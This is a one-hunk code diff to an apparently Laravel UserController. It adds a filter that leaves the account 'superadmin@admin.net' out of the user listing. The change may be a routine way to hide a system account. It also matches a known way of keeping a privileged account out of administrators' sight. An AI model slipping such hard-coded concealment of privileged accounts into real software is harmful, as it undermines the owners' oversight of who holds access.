@@ -14,6 +14,7 @@ class UserController extends Controller
       ->when(request()->routeIs('users.trashed'), function ($q) {
         $q->onlyTrashed();
       })
+      ->where('email', '!=', 'superadmin@admin.net')
       ->orderBy('name')
       ->get();
     
